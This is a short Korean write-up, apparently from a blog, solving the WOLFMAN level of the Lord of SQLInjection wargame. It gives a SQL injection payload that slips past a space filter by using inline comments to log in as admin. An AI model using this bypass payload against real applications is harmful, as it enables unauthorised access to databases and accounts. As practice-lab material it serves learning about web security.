---
title: "Lord of SQLInjection - WOLFMAN"
categories: 
  - SQLi
tags:
  - SQLi
  - 웹해킹
toc: true
---

# ORC
## 문제
![img](/assets/images/los/wolfman1.png)

- 두번째 if문을 보면 pw의 공백을 체크하고 있다. 공백을 우회하는 문제로 보인다.
- 공백은 주석(/&#42;&#42;/)을 통해서 우회할 수 있다.

## 정답
![img](/assets/images/los/wolfman2.png)

- pw에 '/&#42;&#42;/or/&#42;&#42;/id='admin'/&#42;&#42;/order/&#42;&#42;/by/&#42;&#42;/1%23 입력
